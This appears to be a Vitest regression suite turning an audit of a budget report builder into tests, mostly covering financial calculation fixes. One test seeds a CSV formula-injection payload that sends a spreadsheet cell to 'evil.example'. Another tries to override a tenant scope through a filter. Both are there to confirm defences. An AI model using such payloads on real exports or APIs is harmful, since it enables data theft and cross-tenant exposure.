// @vitest-environment node
/**
 * Report Builder — the audit of 2026-08-05, as executable regressions.
 *
 * Numbering matches Phase 15 in `docs/ROADMAP.md`. Two kinds of block:
 *
 *   FIXED — asserts the corrected number, with the wrong one named in the
 *           comment so the regression is legible without the git history.
 *   OPEN  — still pins the WRONG behaviour on purpose, so CI stays green
 *           while the defect is triaged. When the fix lands the test fails,
 *           which is the signal to rewrite it. Three remain: they need a
 *           product decision, not a patch.
 *
 * Severity in the title:
 *   [MONEY]   — the figure a user reads is wrong
 *   [TENANT]  — cross-organization exposure
 *   [CRASH]   — a UI-reachable 500
 *   [SILENT]  — data missing with no indication
 */

import { describe, it, expect, beforeEach, vi } from "vitest"
import { createFakePrisma, type FakePrismaStore } from "@/test/fake-prisma-report"
import { applyComputedFields, ReportConfigError, getEntityComputedFields } from "./report-engine"

const { db } = vi.hoisted(() => ({
  db: { current: null as unknown as Record<string, unknown> },
}))

vi.mock("@/lib/auth", () => ({ auth: vi.fn() }))
vi.mock("@/lib/prisma", () => ({
  prisma: new Proxy({}, { get: (_t, p: string) => (db.current as Record<string, unknown>)?.[p] }),
}))

import { executeBudgetReport } from "./report-engine"
import { mockSession, makeRequest } from "@/test/api-harness"

const ORG = "org_audit_2026aaaaaaaaaaa"
const OTHER_ORG = "org_intruder_2026aaaaaaa"
const PLAN_BUDGET = "plan_budget_2026"
const PLAN_ACTUAL = "plan_actual_2026"

function line(
  id: string,
  planId: string,
  department: string,
  lineType: string,
  plannedAmount: number,
  extra: Record<string, unknown> = {},
) {
  return {
    id, organizationId: ORG, planId, department, lineType, lineSubtype: null,
    plannedAmount, forecastAmount: null, unitPrice: null, unitCost: null,
    quantity: null, costModelKey: null, notes: null, sortOrder: 0,
    accountId: "acc_601", costTypeId: null, departmentId: null,
    companyId: "co_1", monthIndex: null, deletedAt: null, deletedBy: null,
    ...extra,
  }
}

/**
 * Budget 2026 — revenue 1 000 000 (600 000 + 400 000), expense 500 000.
 * Actuals 2026 — revenue   900 000 (550 000 + 350 000), expense 480 000.
 * Both carry the parent code alongside its children, as the imports do.
 */
function seed(): FakePrismaStore {
  return {
    budgetPlan: [
      { id: PLAN_BUDGET, organizationId: ORG, name: "Budget 2026", year: 2026, kind: "budget", status: "approved", deletedAt: null, createdAt: new Date("2026-01-01") },
      { id: PLAN_ACTUAL, organizationId: ORG, name: "Actuals 2026", year: 2026, kind: "actual", status: "approved", deletedAt: null, createdAt: new Date("2026-01-02") },
    ],
    chartOfAccount: [
      { id: "acc_601", organizationId: ORG, code: "601", name: "Revenue" },
      { id: "acc_701", organizationId: ORG, code: "701", name: "Operating expenses" },
    ],
    productLine: [{ id: "pl_a", organizationId: ORG, code: "PL-A", name: "Product A", unit: "ton" }],
    budgetCostType: [], budgetDepartment: [],
    budgetLine: [
      line("bl_601", PLAN_BUDGET, "601", "revenue", 1_000_000),
      line("bl_601_01", PLAN_BUDGET, "601-01", "revenue", 600_000),
      line("bl_601_02", PLAN_BUDGET, "601-02", "revenue", 400_000),
      line("bl_701", PLAN_BUDGET, "701", "expense", 500_000, { accountId: "acc_701", unitPrice: 12, sortOrder: 7 }),
      line("bl_701_01", PLAN_BUDGET, "701-01", "expense", 300_000, { accountId: "acc_701", unitPrice: 8, sortOrder: 3 }),
      line("bl_701_02", PLAN_BUDGET, "701-02", "expense", 200_000, { accountId: "acc_701", unitPrice: 4, sortOrder: 5 }),
      line("al_601", PLAN_ACTUAL, "601", "revenue", 900_000),
      line("al_601_01", PLAN_ACTUAL, "601-01", "revenue", 550_000),
      line("al_601_02", PLAN_ACTUAL, "601-02", "revenue", 350_000),
      line("al_701", PLAN_ACTUAL, "701", "expense", 480_000, { accountId: "acc_701" }),
      line("al_701_01", PLAN_ACTUAL, "701-01", "expense", 280_000, { accountId: "acc_701" }),
      line("al_701_02", PLAN_ACTUAL, "701-02", "expense", 200_000, { accountId: "acc_701" }),
      { ...line("bl_secret", PLAN_BUDGET, "601-01", "revenue", 777_777), organizationId: OTHER_ORG },
    ],
    budgetActual: [
      { id: "ba1", organizationId: ORG, planId: PLAN_ACTUAL, category: "Revenue", department: "601-01", lineType: "revenue", actualAmount: 550_000, expenseDate: null, description: null, currencyCode: "AZN", exchangeRate: null, originalAmount: null, monthIndex: 0, costTypeId: null, departmentId: null, companyId: "co_1", source: "budget-actuals-sheet:ACTUALS CPC", createdAt: new Date("2026-02-01") },
      { id: "ba2", organizationId: ORG, planId: PLAN_ACTUAL, category: "Wages", department: "701-01", lineType: "expense", actualAmount: 280_000, expenseDate: null, description: null, currencyCode: "AZN", exchangeRate: null, originalAmount: null, monthIndex: 0, costTypeId: null, departmentId: null, companyId: "co_1", source: null, createdAt: new Date("2026-02-01") },
    ],
    salesBudgetLine: Array.from({ length: 150 }, (_, i) => ({
      id: `sb${i}`, organizationId: ORG, planId: PLAN_BUDGET, productLineId: "pl_a",
      year: 2026, month: (i % 12) + 1, quantity: 1, unitPrice: 1_000, amount: 1_000, notes: null,
    })),
    cOGSBudgetLine: [
      { id: "cg1", organizationId: ORG, planId: PLAN_BUDGET, productLineId: "pl_a", accountId: "acc_701", year: 2026, month: 1, productionQty: 10, totalCost: 600, notes: null },
    ],
    cashFlowEntry: [
      { id: "cf1", organizationId: ORG, year: 2026, month: 1, entryType: "inflow", source: "sales", amount: 5_000, description: null, activityType: "operating", isProjected: false, plannedAmount: 0, accountId: "acc_601", companyId: "co_1", createdAt: new Date("2026-01-31"), deletedAt: null },
      { id: "cf2", organizationId: ORG, year: 2026, month: 1, entryType: "outflow", source: "payroll", amount: 3_000, description: null, activityType: "operating", isProjected: false, plannedAmount: 0, accountId: "acc_701", companyId: "co_1", createdAt: new Date("2026-01-31"), deletedAt: null },
    ],
    balanceSheetLine: [], budgetForecastEntry: [], budgetAssumption: [],
  }
}

beforeEach(() => {
  db.current = createFakePrisma(seed()) as unknown as Record<string, unknown>
})

const sum = (rows: Array<Record<string, unknown>>, f: string) =>
  rows.reduce((s, r) => s + (typeof r[f] === "number" ? (r[f] as number) : 0), 0)

const planVsFact = (extra: Record<string, unknown> = {}) => ({
  entityType: "budgetLines",
  planId: PLAN_BUDGET,
  columns: [{ field: "department" }, { field: "plannedAmount" }],
  filters: [] as Array<{ field: string; op: string; value: unknown }>,
  ...extra,
})

// ─────────────────────────────────────────────────────────────
describe("BUG-01 [MONEY] FIXED — variance is plan minus fact, not the plan", () => {
  /**
   * Was: `applyComputedFields` read `row.actualAmount`, a column that exists
   * only on `BudgetActual` — a model no entity mapped to. `actual` was always
   * 0, so variance returned the plan unchanged (600 000 here).
   * Now: the entity declares its measures and the engine pairs each budget row
   * with the matching-year actuals plan on the account code.
   */
  it("pairs the budget row with the actuals plan on the account code", async () => {
    const res = await executeBudgetReport(ORG, planVsFact({
      filters: [{ field: "department", op: "eq", value: "601-01" }],
      computedFields: ["variance"],
    }))
    expect(res.data[0].plannedAmount).toBe(600_000)
    expect(res.data[0].actualAmount).toBe(550_000)
    expect(res.data[0].variance).toBe(50_000) // was 600 000
  })

  it("variance across the whole P&L reconciles with plan − fact", async () => {
    const res = await executeBudgetReport(ORG, planVsFact({ computedFields: ["variance"] }))
    expect(sum(res.data, "plannedAmount")).toBe(1_500_000)
    expect(sum(res.data, "actualAmount")).toBe(1_380_000)
    expect(sum(res.data, "variance")).toBe(120_000)
  })

  it("a plan code with no realized rows reports the plan as the variance, not null", async () => {
    const store = seed()
    store.budgetLine = (store.budgetLine as Array<Record<string, unknown>>).filter(
      (r) => r.id !== "al_601_02",
    )
    db.current = createFakePrisma(store) as unknown as Record<string, unknown>
    const res = await executeBudgetReport(ORG, planVsFact({
      filters: [{ field: "department", op: "eq", value: "601-02" }],
      computedFields: ["variance"],
    }))
    // The actuals plan exists and simply has nothing on this code — that is a
    // realized zero, which is a different statement from "unknown".
    expect(res.data[0].actualAmount).toBe(0)
    expect(res.data[0].variance).toBe(400_000)
  })

  it("no actuals plan for the year → null, never a fabricated zero", async () => {
    const store = seed()
    store.budgetPlan = (store.budgetPlan as Array<Record<string, unknown>>).filter(
      (p) => p.id !== PLAN_ACTUAL,
    )
    store.budgetLine = (store.budgetLine as Array<Record<string, unknown>>).filter(
      (r) => r.planId !== PLAN_ACTUAL,
    )
    db.current = createFakePrisma(store) as unknown as Record<string, unknown>
    const res = await executeBudgetReport(ORG, planVsFact({ computedFields: ["variance"] }))
    expect(res.data.every((r) => r.variance === null)).toBe(true)
  })

  it("the legacy no-measures contract is untouched for direct callers", () => {
    expect(applyComputedFields([{ plannedAmount: 100, actualAmount: 80 }], ["variance"])[0].variance).toBe(20)
  })
})

describe("BUG-02 [MONEY] FIXED — execution % is a real ratio", () => {
  it("550 000 realized against a 600 000 budget is 91.7 %", async () => {
    const res = await executeBudgetReport(ORG, planVsFact({
      filters: [{ field: "department", op: "eq", value: "601-01" }],
      computedFields: ["execution_pct"],
    }))
    expect(res.data[0].execution_pct).toBeCloseTo(91.667, 3) // was 0
  })

  it("a zero budget has no execution percentage — null, not 0 %", async () => {
    const store = seed()
    ;(store.budgetLine as Array<Record<string, unknown>>).push(
      line("bl_zero", PLAN_BUDGET, "801-01", "expense", 0),
      line("al_zero", PLAN_ACTUAL, "801-01", "expense", 12_000),
    )
    db.current = createFakePrisma(store) as unknown as Record<string, unknown>
    const res = await executeBudgetReport(ORG, planVsFact({
      filters: [{ field: "department", op: "eq", value: "801-01" }],
      computedFields: ["execution_pct"],
    }))
    // 12 000 spent against a 0 budget reported as "0 % executed" was the
    // opposite of what happened.
    expect(res.data[0].execution_pct).toBeNull()
  })
})

describe("BUG-03 [MONEY] FIXED — margin % is offered only where both operands exist", () => {
  /**
   * Was: `amount` fell back to the planned figure and `totalCost` to the
   * (absent) actual, so every P&L row reported a 100 % margin and every COGS
   * row 0 %. No entity carries revenue AND its cost, so the honest answer is
   * that the field cannot be produced there.
   */
  it("no data source claims a margin it cannot compute", () => {
    for (const entity of ["budgetLines", "budgetActuals", "salesBudget", "cogsBudget", "cashFlow", "balanceSheet"]) {
      expect(getEntityComputedFields(entity)).not.toContain("margin_pct")
    }
  })

  it("budgetLines offers variance and execution, and nothing else", () => {
    expect(getEntityComputedFields("budgetLines")).toEqual(["variance", "execution_pct"])
  })

  it("a fact-only source offers neither — there is no plan to compare against", () => {
    expect(getEntityComputedFields("budgetActuals")).toEqual([])
    expect(getEntityComputedFields("actualsLedger")).toEqual([])
  })

  it("asking anyway yields null values and a stated reason, not 100 %", async () => {
    const res = await executeBudgetReport(ORG, planVsFact({ computedFields: ["margin_pct"] }))
    expect(res.data.every((r) => r.margin_pct === null)).toBe(true) // was 100 on every row
    expect(res.computedFieldsUnavailable).toEqual(["margin_pct"])
  })
})

// ─────────────────────────────────────────────────────────────
describe("BUG-04 [MONEY] FIXED — a filter no longer re-promotes a parent code", () => {
  /**
   * Was: the parent set was derived from the already-filtered rows, so a
   * filter that removed a child stopped its parent looking like a parent and
   * the whole 701 branch rejoined the total next to two 601 children.
   * Now: the code universe is scanned on the org + plan scope alone.
   */
  it("unfiltered: children only", async () => {
    const res = await executeBudgetReport(ORG, planVsFact())
    expect(res.data.map((r) => r.department).sort()).toEqual(["601-01", "601-02", "701-01", "701-02"])
    expect(sum(res.data, "plannedAmount")).toBe(1_500_000)
  })

  it("with `plannedAmount >= 400000`: still children only", async () => {
    const res = await executeBudgetReport(ORG, planVsFact({
      filters: [{ field: "plannedAmount", op: "gte", value: 400_000 }],
    }))
    expect(res.data.map((r) => r.department).sort()).toEqual(["601-01", "601-02"]) // was [601-01, 601-02, 701]
    expect(sum(res.data, "plannedAmount")).toBe(1_000_000) // was 1 500 000
  })

  it("an `eq` filter on the code survives the exclusion intact", async () => {
    // The exclusion used to spread the filter value; spreading the string
    // "601-01" produced `{0:"6",1:"0",…}` and Prisma rejected the query.
    const res = await executeBudgetReport(ORG, planVsFact({
      filters: [{ field: "department", op: "eq", value: "601-01" }],
    }))
    expect(res.data).toHaveLength(1)
    expect(res.data[0].department).toBe("601-01")
  })
})

describe("BUG-05 [MONEY] FIXED — the Fakt source de-duplicates parent codes too", () => {
  it("actual revenue is 900 000, not 1 800 000", async () => {
    const res = await executeBudgetReport(ORG, {
      entityType: "budgetActuals", planId: PLAN_ACTUAL,
      columns: [{ field: "department" }, { field: "plannedAmount" }],
      filters: [{ field: "lineType", op: "eq", value: "revenue" }],
    })
    expect(res.data.map((r) => r.department).sort()).toEqual(["601-01", "601-02"])
    expect(sum(res.data, "plannedAmount")).toBe(900_000) // was 1 800 000, exactly 2×
  })

  it("plan and fact are now on the same footing", async () => {
    const plan = await executeBudgetReport(ORG, planVsFact())
    const fact = await executeBudgetReport(ORG, {
      entityType: "budgetActuals", planId: PLAN_ACTUAL,
      columns: [{ field: "plannedAmount" }], filters: [],
    })
    expect(sum(plan.data, "plannedAmount")).toBe(1_500_000)
    expect(sum(fact.data, "plannedAmount")).toBe(1_380_000) // was 2 760 000
  })
})

// ─────────────────────────────────────────────────────────────
describe("BUG-06 [TENANT] FIXED — a filter can no longer overwrite the org scope", () => {
  /**
   * Was: `buildWhere` seeded `{organizationId}` and then wrote
   * `where[f.field] = f.value` for any caller-supplied field, so a filter
   * named `organizationId` replaced the tenant scope. The engine runs on the
   * plain prisma client, not `withOrgScope`, so no RLS policy sat behind it.
   * Now: every field name must appear in the entity's declared field list,
   * and `organizationId` is in none of them.
   */
  it("engine level: rejected as a config error", async () => {
    await expect(
      executeBudgetReport(ORG, {
        entityType: "budgetLines",
        columns: [{ field: "plannedAmount" }],
        filters: [{ field: "organizationId", op: "eq", value: OTHER_ORG }],
      }),
    ).rejects.toThrow(ReportConfigError)
  })

  it("engine level: the other tenant's row stays invisible", async () => {
    const res = await executeBudgetReport(ORG, planVsFact({ planId: undefined }))
    expect(res.data.every((r) => r.plannedAmount !== 777_777)).toBe(true)
  })

  it("route level: /preview answers 400 and leaks nothing", async () => {
    const { POST } = await import("@/app/api/budgeting/reports/preview/route")
    await mockSession({ orgId: ORG, userId: "u1", role: "viewer" })
    const res = await POST(
      makeRequest("/api/budgeting/reports/preview", {
        method: "POST",
        json: {
          entityType: "budgetLines",
          columns: [{ field: "plannedAmount" }],
          filters: [{ field: "organizationId", op: "eq", value: OTHER_ORG }],
        },
      }),
    )
    expect(res.status).toBe(400)
    expect(JSON.stringify(await res.json())).not.toContain("777777")
  })

  it("route level: the CSV export answers 400 and leaks nothing", async () => {
    const { POST } = await import("@/app/api/budgeting/reports/export/route")
    await mockSession({ orgId: ORG, userId: "u1", role: "editor" })
    const res = await POST(
      makeRequest("/api/budgeting/reports/export", {
        method: "POST",
        json: {
          format: "csv", entityType: "budgetLines",
          columns: [{ field: "plannedAmount" }],
          filters: [{ field: "organizationId", op: "eq", value: OTHER_ORG }],
        },
      }),
    )
    expect(res.status).toBe(400)
    expect(await res.text()).not.toContain("777777")
  })

  it("`planId` cannot be smuggled in as a filter either", async () => {
    await expect(
      executeBudgetReport(ORG, {
        entityType: "budgetLines",
        columns: [{ field: "plannedAmount" }],
        filters: [{ field: "planId", op: "eq", value: PLAN_ACTUAL }],
      }),
    ).rejects.toThrow(/Unknown filter field "planId"/)
  })

  it("an unknown column, sort or group is refused before any query runs", async () => {
    for (const cfg of [
      { columns: [{ field: "nope" }], filters: [] },
      { columns: [{ field: "plannedAmount" }], filters: [], sortBy: "nope" },
      { columns: [{ field: "plannedAmount" }], filters: [], groupBy: "nope" },
    ]) {
      await expect(
        executeBudgetReport(ORG, { entityType: "budgetLines", ...cfg }),
      ).rejects.toThrow(ReportConfigError)
    }
  })
})

// ─────────────────────────────────────────────────────────────
describe("BUG-07 [CRASH] FIXED — relation fields the UI offers now work", () => {
  /**
   * Was: the Sort By and Filter pickers listed dotted relation paths that
   * Prisma rejects as literal keys, so the panel reported "Couldn't build the
   * report" (a 500) for its own options. Now they are translated into
   * Prisma's nested to-one form.
   */
  it("sorting by `plan.year` sorts instead of throwing", async () => {
    const res = await executeBudgetReport(ORG, planVsFact({ sortBy: "plan.year", sortOrder: "desc" }))
    expect(res.data.length).toBeGreaterThan(0)
  })

  it("filtering on `account.code` filters instead of throwing", async () => {
    const res = await executeBudgetReport(ORG, planVsFact({
      columns: [{ field: "department" }, { field: "plannedAmount" }, { field: "account.code" }],
      filters: [{ field: "account.code", op: "eq", value: "701" }],
    }))
    expect(res.data.map((r) => r.department).sort()).toEqual(["701-01", "701-02"])
  })

  it("a numeric relation field is coerced, so `plan.year` = \"2026\" matches", async () => {
    const res = await executeBudgetReport(ORG, planVsFact({
      filters: [{ field: "plan.year", op: "eq", value: "2026" }],
    }))
    expect(res.data).toHaveLength(4)
  })

  it("grouping by a relation is refused with a 400, since Prisma cannot do it", async () => {
    const { POST } = await import("@/app/api/budgeting/reports/preview/route")
    await mockSession({ orgId: ORG, userId: "u1", role: "viewer" })
    const res = await POST(
      makeRequest("/api/budgeting/reports/preview", {
        method: "POST",
        json: {
          entityType: "budgetLines", planId: PLAN_BUDGET,
          columns: [{ field: "department" }], groupBy: "plan.year",
        },
      }),
    )
    expect(res.status).toBe(400) // was 500
  })

  it("`contains` on a number column is a 400, not a 500", async () => {
    await expect(
      executeBudgetReport(ORG, planVsFact({
        filters: [{ field: "plannedAmount", op: "contains", value: "600" }],
      })),
    ).rejects.toThrow(/needs a text column/)
  })
})

describe("BUG-08 [CRASH] FIXED — an unknown data source is a 400 on export too", () => {
  it("export matches preview: 400 with the valid options listed", async () => {
    const { POST } = await import("@/app/api/budgeting/reports/export/route")
    await mockSession({ orgId: ORG, userId: "u1", role: "editor" })
    const res = await POST(
      makeRequest("/api/budgeting/reports/export", {
        method: "POST",
        json: { format: "csv", entityType: "generalLedger" },
      }),
    )
    expect(res.status).toBe(400) // was 500
    expect((await res.json()).available).toContain("budgetLines")
  })
})

// ─────────────────────────────────────────────────────────────
describe("BUG-09 [SILENT] FIXED — a truncated result says so", () => {
  it("flat: the response is flagged when the page was filled", async () => {
    const res = await executeBudgetReport(ORG, {
      entityType: "salesBudget", planId: PLAN_BUDGET,
      columns: [{ field: "amount", aggregate: "sum" }], filters: [], limit: 100,
    })
    expect(res.total).toBe(100)
    expect(res.truncated).toBe(true)
  })

  it("flat: a complete result is not flagged", async () => {
    const res = await executeBudgetReport(ORG, {
      entityType: "salesBudget", planId: PLAN_BUDGET,
      columns: [{ field: "amount" }], filters: [], limit: 500,
    })
    expect(res.total).toBe(150)
    expect(res.truncated).toBeUndefined()
  })

  it("period: buckets built from a truncated scan are flagged", async () => {
    const res = await executeBudgetReport(ORG, {
      entityType: "salesBudget", planId: PLAN_BUDGET,
      columns: [{ field: "year" }, { field: "month" }, { field: "amount" }],
      filters: [], periodGroupBy: "year", limit: 100,
    })
    expect(res.truncated).toBe(true)
  })

  it("the export takes the full cap rather than the preview page size", async () => {
    const { POST } = await import("@/app/api/budgeting/reports/export/route")
    await mockSession({ orgId: ORG, userId: "u1", role: "editor" })
    const res = await POST(
      makeRequest("/api/budgeting/reports/export", {
        method: "POST",
        json: {
          format: "csv", entityType: "salesBudget", planId: PLAN_BUDGET,
          columns: [{ field: "amount" }], filters: [],
          limit: 100, // the preview page size the client sends — must be ignored
        },
      }),
    )
    const lines = (await res.text()).trim().split("\n")
    expect(lines).toHaveLength(151) // header + 150 rows, was header + 100
  })
})

describe("BUG-10 [SILENT] FIXED — computed fields reach grouped reports and exports", () => {
  it("groupBy on the account code pairs each group with its realized total", async () => {
    const res = await executeBudgetReport(ORG, {
      entityType: "budgetLines", planId: PLAN_BUDGET,
      columns: [{ field: "plannedAmount", aggregate: "sum" }], filters: [],
      groupBy: "department", computedFields: ["variance"],
    })
    const g = res.data.find((r) => r.department === "601-01")!
    expect(g.plannedAmount).toBe(600_000)
    expect(g.variance).toBe(50_000) // the column used to be absent entirely
  })

  it("CSV export carries the computed columns the screen showed", async () => {
    const { POST } = await import("@/app/api/budgeting/reports/export/route")
    await mockSession({ orgId: ORG, userId: "u1", role: "editor" })
    const res = await POST(
      makeRequest("/api/budgeting/reports/export", {
        method: "POST",
        json: {
          format: "csv", entityType: "budgetLines", planId: PLAN_BUDGET,
          columns: [{ field: "department" }, { field: "plannedAmount" }],
          computedFields: ["variance", "execution_pct"],
          filters: [{ field: "department", op: "eq", value: "601-01" }],
        },
      }),
    )
    const lines = (await res.text()).split("\n")
    expect(lines[0]).toBe("Department,Planned Amount,Variance,Execution %")
    expect(lines[1]).toMatch(/^601-01,600000,50000,91\.66/)
  })
})

describe("BUG-12 [MONEY] FIXED — groupBy only sums additive columns", () => {
  it("unit prices and sort orders are no longer added up", async () => {
    const res = await executeBudgetReport(ORG, {
      entityType: "budgetLines", planId: PLAN_BUDGET,
      columns: [{ field: "plannedAmount", aggregate: "sum" }], filters: [], groupBy: "lineType",
    })
    const expense = res.data.find((r) => r.lineType === "expense")!
    expect(expense.plannedAmount).toBe(500_000)
    expect(expense.unitPrice).toBeUndefined() // was 12 — the sum of two rates
    expect(expense.sortOrder).toBeUndefined() // was 8 — the sum of two ordinals
  })

  it("the row count per group still comes back", async () => {
    const res = await executeBudgetReport(ORG, {
      entityType: "budgetLines", planId: PLAN_BUDGET,
      columns: [{ field: "plannedAmount", aggregate: "sum" }], filters: [], groupBy: "lineType",
    })
    expect(res.data.find((r) => r.lineType === "revenue")!.count).toBe(2)
  })
})

describe("BUG-14 [SILENT] FIXED — CSV cells cannot execute on open", () => {
  it("a note starting with `=` is neutralized", async () => {
    const store = seed()
    store.budgetLine = [line("bl_x", PLAN_BUDGET, "601-01", "revenue", 1, {
      notes: '=HYPERLINK("http://evil.example/?d="&A1,"click")',
    })]
    db.current = createFakePrisma(store) as unknown as Record<string, unknown>

    const { POST } = await import("@/app/api/budgeting/reports/export/route")
    await mockSession({ orgId: ORG, userId: "u1", role: "editor" })
    const res = await POST(
      makeRequest("/api/budgeting/reports/export", {
        method: "POST",
        json: {
          format: "csv", entityType: "budgetLines", planId: PLAN_BUDGET,
          columns: [{ field: "notes" }], filters: [],
        },
      }),
    )
    const csv = await res.text()
    expect(csv).toContain("'=HYPERLINK(") // leading quote keeps Excel from running it
    expect(csv).not.toMatch(/(^|,|")=HYPERLINK/m)
  })

  it("ordinary text and negative numbers are untouched", async () => {
    const store = seed()
    store.budgetLine = [line("bl_y", PLAN_BUDGET, "601-01", "revenue", -5, { notes: "Rent, office" })]
    db.current = createFakePrisma(store) as unknown as Record<string, unknown>

    const { POST } = await import("@/app/api/budgeting/reports/export/route")
    await mockSession({ orgId: ORG, userId: "u1", role: "editor" })
    const res = await POST(
      makeRequest("/api/budgeting/reports/export", {
        method: "POST",
        json: {
          format: "csv", entityType: "budgetLines", planId: PLAN_BUDGET,
          columns: [{ field: "notes" }, { field: "plannedAmount" }], filters: [],
        },
      }),
    )
    // A negative amount is a number cell, not a formula — it must not gain a
    // quote, or every negative variance in the file becomes text.
    expect((await res.text()).split("\n")[1]).toBe('"Rent, office",-5')
  })
})

describe("BUG-15 [SILENT] FIXED — min / max on an empty result is 0, not Infinity", () => {
  it("survives JSON serialization as a number", async () => {
    const res = await executeBudgetReport(ORG, planVsFact({
      columns: [{ field: "plannedAmount", aggregate: "min" }],
      filters: [{ field: "department", op: "eq", value: "no-such-code" }],
    }))
    if (res.type === "flat") {
      expect(res.aggregates?.plannedAmount_min).toBe(0) // was Infinity → null over the wire
      expect(JSON.parse(JSON.stringify(res.aggregates)).plannedAmount_min).toBe(0)
    }
  })
})

describe("BUG-16 [SILENT] FIXED — grouping scans the table once", () => {
  it("no second unbounded findMany just to count rows", async () => {
    const stats = (db.current as unknown as { __stats: { rowsScanned: number; findMany: number } }).__stats
    const before = { rows: stats.rowsScanned, calls: stats.findMany }
    await executeBudgetReport(ORG, {
      entityType: "salesBudget", planId: PLAN_BUDGET,
      columns: [{ field: "amount", aggregate: "sum" }], filters: [],
      groupBy: "month", limit: 5,
    })
    // The count now rides on the groupBy aggregate. Was: 1 extra findMany
    // pulling all 150 rows into Node (44 000 on live budget_lines).
    expect(stats.findMany - before.calls).toBe(0)
    expect(stats.rowsScanned - before.rows).toBe(0)
  })
})

describe("New — the accounting ledger is reachable as its own source", () => {
  /**
   * `budgetActuals` reads the actuals PLAN's budget lines, justified by a note
   * that the `BudgetActual` table "is empty in this deployment". That was
   * written in May; five paths write it today, the AI Auto Import among them.
   * Both sources are exposed so the two can be reconciled.
   */
  it("reads BudgetActual with its own actualAmount column", async () => {
    const res = await executeBudgetReport(ORG, {
      entityType: "actualsLedger", planId: PLAN_ACTUAL,
      columns: [{ field: "category" }, { field: "department" }, { field: "actualAmount" }, { field: "source" }],
      filters: [],
    })
    expect(res.data).toHaveLength(2)
    expect(sum(res.data, "actualAmount")).toBe(830_000)
  })

  it("provenance is exposed, so import rows can be told from hand-entered ones", async () => {
    const res = await executeBudgetReport(ORG, {
      entityType: "actualsLedger", planId: PLAN_ACTUAL,
      columns: [{ field: "department" }, { field: "actualAmount" }, { field: "source" }],
      filters: [{ field: "source", op: "contains", value: "budget-actuals-sheet" }],
    })
    expect(res.data).toHaveLength(1)
    expect(res.data[0].department).toBe("601-01")
  })

  it("is org-scoped like every other source", async () => {
    const res = await executeBudgetReport(OTHER_ORG, {
      entityType: "actualsLedger",
      columns: [{ field: "actualAmount" }], filters: [],
    })
    expect(res.data).toEqual([])
  })
})

// ═════════════════════════════════════════════════════════════
// STILL OPEN — pinned at the wrong behaviour on purpose.
// ═════════════════════════════════════════════════════════════

describe("BUG-11 [MONEY] OPEN — cash flow sums inflows and outflows into one 'Amount'", () => {
  /**
   * CashFlowEntry stores `Math.abs(amount)` with the direction in `entryType`
   * (`dynamic-cf-adapter.ts:10`, `statement-controls-adapter.ts:339`). A
   * period roll-up therefore reports gross turnover where the reader expects
   * net cash. Fixing it means a signed measure on the entity, which is the
   * same decision as BUG-13 and belongs with it.
   */
  it("January nets +2 000; the report still says 8 000", async () => {
    const res = await executeBudgetReport(ORG, {
      entityType: "cashFlow",
      columns: [{ field: "year" }, { field: "month" }, { field: "amount" }],
      filters: [], periodGroupBy: "month",
    })
    expect(res.data[0].amount).toBe(8_000)
  })
})

describe("BUG-13 [MONEY] OPEN — revenue and expense are added with no sign convention", () => {
  /**
   * `lineType` distinguishes them and nothing applies a sign, so an
   * unfiltered P&L total is revenue + costs. Needs a product decision: which
   * way is favourable for a cost line, and whether the builder should net by
   * `lineType` or refuse to total across it.
   */
  it("an unfiltered P&L total adds 1 000 000 of revenue to 500 000 of cost", async () => {
    const res = await executeBudgetReport(ORG, planVsFact({
      columns: [{ field: "lineType" }, { field: "plannedAmount" }],
    }))
    expect(sum(res.data, "plannedAmount")).toBe(1_500_000) // the net result is +500 000
  })
})

describe("BUG-17 [MONEY] OPEN — 'All plans' sums every plan of every year", () => {
  /**
   * `planId` defaults to "" in the picker and nothing narrows by plan kind or
   * year, so the opening state of the screen adds budget to fact. Needs a
   * product decision: default to the latest plan, or refuse to report until
   * one is chosen.
   */
  it("budgetLines with no plan adds the budget plan and the actuals plan together", async () => {
    const res = await executeBudgetReport(ORG, {
      entityType: "budgetLines",
      columns: [{ field: "department" }, { field: "plannedAmount" }],
      filters: [{ field: "lineType", op: "eq", value: "revenue" }],
    })
    expect(sum(res.data, "plannedAmount")).toBe(1_900_000)
  })

  it("Fakt with no plan still returns budget lines labelled as actuals", async () => {
    const res = await executeBudgetReport(ORG, {
      entityType: "budgetActuals",
      columns: [{ field: "department" }, { field: "plannedAmount" }],
      filters: [{ field: "department", op: "eq", value: "601-01" }],
    })
    const amounts = res.data.map((r) => r.plannedAmount).sort((a, b) => Number(a) - Number(b))
    expect(amounts).toEqual([550_000, 600_000])
  })
})
